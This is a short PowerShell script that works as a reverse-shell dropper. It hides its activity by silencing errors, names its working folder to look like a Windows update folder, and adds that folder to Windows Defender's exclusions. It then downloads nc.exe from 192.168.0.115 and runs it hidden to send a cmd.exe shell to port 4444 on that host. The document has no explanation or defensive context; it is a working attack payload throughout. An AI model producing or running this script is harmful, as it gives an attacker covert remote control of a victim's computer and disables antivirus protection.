# Set global error action to silently continue
$ErrorActionPreference = 'SilentlyContinue'

# Define temporary folder and executable name
$TempDir = "$env:TEMP\WinUpdateTemp"
$NcPath = "$TempDir\nc.exe"

# Create the temp folder (ignore if exists)
try {
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
} catch {}

# Try to exclude the folder from Windows Defender
try {
    Add-MpPreference -ExclusionPath $TempDir
} catch {}

# Try downloading nc.exe
try {
    Invoke-WebRequest -Uri "http://192.168.0.115/nc.exe" -OutFile $NcPath
} catch {}

# Try running nc.exe silently to connect to listener
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $WshShell.Run("`"$NcPath`" 192.168.0.115 4444 -e cmd.exe", 0, $false)
} catch {}

# Optional sleep to give time for reverse shell
Start-Sleep -Seconds 5
